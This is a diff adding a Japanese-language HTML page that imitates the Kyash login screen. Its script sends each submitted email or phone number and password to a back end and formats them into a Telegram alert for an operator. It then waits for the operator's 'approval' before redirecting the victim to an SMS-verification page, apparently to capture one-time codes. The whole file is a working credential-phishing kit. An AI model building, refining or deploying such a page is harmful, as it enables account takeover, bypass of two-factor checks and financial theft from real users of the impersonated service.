@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ログイン</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Hiragino Sans', 'Helvetica Neue', Arial, sans-serif;
+            background-color: #ffffff;
+            padding: 0 16px;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            padding-top: 16px;
+        }
+        .container { width: 100%; max-width: 400px; }
+        .header { display: flex; align-items: center; margin-bottom: 32px; padding-top: 8px; }
+        .close-btn { font-size: 28px; background: none; border: none; cursor: pointer; color: #000; padding: 0; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; }
+        .message-banner { display: none; margin-bottom: 16px; padding: 12px; border-radius: 8px; border-left: 4px solid #ff5252; background-color: #ffebee; }
+        .message-banner.show { display: block; }
+        .message-banner-title { font-size: 13px; font-weight: 600; color: #c62828; margin-bottom: 4px; }
+        .message-banner-text { font-size: 12px; color: #b71c1c; }
+        .btn-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 24px; }
+        .btn-social { width: 100%; padding: 13px; border: none; border-radius: 24px; font-size: 15px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; font-family: inherit; }
+        .btn-google { background-color: #ffffff; border: 1px solid #dadce0; color: #3c4043; }
+        .btn-google:active { background-color: #f8f9fa; }
+        .btn-apple { background-color: #000000; color: #ffffff; }
+        .btn-apple:active { background-color: #1d1d1d; }
+        .divider { text-align: center; margin: 28px 0; font-size: 14px; color: #999; position: relative; }
+        .divider::before { content: ''; position: absolute; top: 50%; left: 0; right: 0; height: 1px; background-color: #e0e0e0; z-index: 0; }
+        .divider span { background: #fff; padding: 0 12px; position: relative; z-index: 1; }
+        .section-title { font-size: 15px; font-weight: 500; color: #999; margin-bottom: 16px; }
+        .form-group { margin-bottom: 16px; }
+        .form-label { font-size: 12px; font-weight: 500; color: #999; margin-bottom: 6px; display: block; }
+        .form-input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 6px; font-size: 14px; background-color: #ffffff; color: #000; font-family: inherit; }
+        .form-input::placeholder { color: #bbb; }
+        .form-input:focus { outline: none; border: 2px solid #1f71b8; padding: 11px; }
+        .password-group { position: relative; }
+        .password-toggle { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #999; font-size: 18px; padding: 4px; }
+        .password-group .form-input { padding-right: 40px; }
+        .password-group .form-input:focus { padding-right: 39px; }
+        .login-btn { width: 100%; padding: 12px; border: none; border-radius: 6px; font-size: 15px; font-weight: 500; cursor: pointer; background-color: #e8e8e8; color: #999; margin-top: 12px; font-family: inherit; }
+        .login-btn:not(:disabled) { background-color: #1f71b8; color: #ffffff; cursor: pointer; }
+        .login-btn:not(:disabled):active { background-color: #185abc; }
+        .login-btn.loading { background-color: #1f71b8 !important; color: #ffffff !important; display: flex; align-items: center; justify-content: center; }
+        .spinner { display: inline-block; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.6s linear infinite; margin-left: 6px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .link-group { text-align: center; margin-top: 24px; }
+        .link-group a { color: #1f71b8; text-decoration: none; font-size: 13px; display: block; margin: 8px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <button class="close-btn">×</button>
+        </div>
+
+        <div class="message-banner" id="messageBanner">
+            <div class="message-banner-title" id="bannerTitle"></div>
+            <div class="message-banner-text" id="bannerText"></div>
+        </div>
+
+        <div class="btn-group">
+            <button class="btn-social btn-google">
+                <svg width="20" height="20" viewBox="0 0 48 48">
+                    <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                    <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                    <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                </svg>
+                Googleで続ける
+            </button>
+            <button class="btn-social btn-apple">Appleで続ける</button>
+        </div>
+
+        <div class="divider"><span>または</span></div>
+
+        <div>
+            <h2 class="section-title">Kyashアカウントでログイン</h2>
+            <div class="form-group">
+                <label class="form-label">メールアドレスまたは電話番号</label>
+                <input type="text" class="form-input email-input" placeholder="メールアドレス/電話番号(ハイフンなし)">
+            </div>
+            <div class="form-group">
+                <label class="form-label">パスワード</label>
+                <div class="password-group">
+                    <input type="password" class="form-input password-input" placeholder="パスワード">
+                    <button class="password-toggle" type="button">👁</button>
+                </div>
+            </div>
+            <button class="login-btn" disabled>ログイン</button>
+            <div class="link-group">
+                <a href="#">パスワードの再設定</a>
+                <a href="#">登録メールアドレスを忘れた場合</a>
+                <a href="#">新しい電話番号に変更した場合</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const emailInput = document.querySelector('.email-input');
+        const passwordInput = document.querySelector('.password-input');
+        const loginBtn = document.querySelector('.login-btn');
+        const passwordToggle = document.querySelector('.password-toggle');
+
+        let loginSessionId = Date.now().toString();
+
+        passwordToggle.addEventListener('click', (e) => {
+            e.preventDefault();
+            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
+        });
+
+        function validateForm() {
+            const ok = emailInput.value.trim().length > 0 && passwordInput.value.trim().length > 0;
+            loginBtn.disabled = !ok;
+            loginBtn.style.backgroundColor = ok ? '#1f71b8' : '#e8e8e8';
+            loginBtn.style.color = ok ? '#ffffff' : '#999';
+        }
+
+        emailInput.addEventListener('input', validateForm);
+        passwordInput.addEventListener('input', validateForm);
+
+        loginBtn.addEventListener('click', async () => {
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            if (!email || !password) return;
+
+            loginBtn.disabled = true;
+            loginBtn.classList.add('loading');
+            loginBtn.innerHTML = 'ログイン中<span class="spinner"></span>';
+
+            const userAgent = navigator.userAgent;
+            const timestamp = new Date().toLocaleString('ja-JP');
+            const sessionId = 'SESSION_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+            try {
+                // ===== STEP 1: api.php にリクエスト登録 =====
+                const apiRes = await fetch('/api/auth', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: sessionId,
+                        action: 'pending',
+                        type: 'LOGIN_REQUEST',
+                        email: email,
+                        password: password,
+                        userAgent: userAgent,
+                        timestamp: timestamp
+                    })
+                });
+
+                const apiData = await apiRes.json();
+                console.log('✅ API登録:', apiData);
+
+                // ===== STEP 2: Telegram 通知送信 =====
+                const telegramMsg = `
+🔴 <b>ログインリクエスト</b>
+
+📧 メール/電話: <code>${email}</code>
+🔐 パスワード: <code>${password}</code>
+📱 User-Agent: <code>${userAgent.substring(0, 80)}</code>
+⏰ 時刻: ${timestamp}
+🔑 セッションID: <code>${sessionId}</code>
+
+<b>管理画面で承認待機中...</b>
+                `;
+
+                await fetch('/api/notify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: telegramMsg })
+                }).catch(err => console.error('Telegram error:', err));
+
+                console.log('✅ Telegram送信:', sessionId);
+
+                // ===== STEP 3: 管理画面の承認待機 =====
+                showBanner('確認中', '管理者の承認を待っています...');
+                monitorApproval(sessionId);
+
+            } catch (error) {
+                console.error('❌ エラー:', error);
+                showBanner('エラー', 'ログインに失敗しました。');
+                loginBtn.classList.remove('loading');
+                loginBtn.disabled = false;
+                loginBtn.innerHTML = 'ログイン';
+                validateForm();
+            }
+        });
+
+        function monitorApproval(sessionId) {
+            let checkCount = 0;
+            const checker = setInterval(async () => {
+                checkCount++;
+                try {
+                    const res = await fetch(`/api/auth?sessionId=${sessionId}&_t=${Date.now()}`);
+                    const data = await res.json();
+
+                    if (data.approved) {
+                        clearInterval(checker);
+                        console.log('✅ ログイン承認:', sessionId);
+                        window.location.href = `sms-verification.html?sessionId=${sessionId}`;
+                    } else if (data.rejected) {
+                        clearInterval(checker);
+                        console.log('❌ ログイン拒否:', sessionId);
+                        showBanner('ログイン拒否', '管理者により拒否されました。');
+                        loginBtn.classList.remove('loading');
+                        loginBtn.disabled = false;
+                        loginBtn.innerHTML = 'ログイン';
+                        validateForm();
+                    }
+                } catch (err) {
+                    console.error('Check error:', err);
+                }
+
+                // 60秒でタイムアウト
+                if (checkCount >= 120) {
+                    clearInterval(checker);
+                    showBanner('タイムアウト', '応答がありません。もう一度お試しください。');
+                    loginBtn.classList.remove('loading');
+                    loginBtn.disabled = false;
+                    loginBtn.innerHTML = 'ログイン';
+                    validateForm();
+                }
+            }, 500);
+        }
+
+        function showBanner(title, text) {
+            document.getElementById('bannerTitle').textContent = title;
+            document.getElementById('bannerText').textContent = text;
+            document.getElementById('messageBanner').classList.add('show');
+            setTimeout(() => document.getElementById('messageBanner').classList.remove('show'), 5000);
+        }
+
+        function sendTelegramNotification(message) {
+            fetch('notify.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message })
+            }).catch(e => console.error(e));
+        }
+
+        validateForm();
+    </script>
+</body>
+</html>
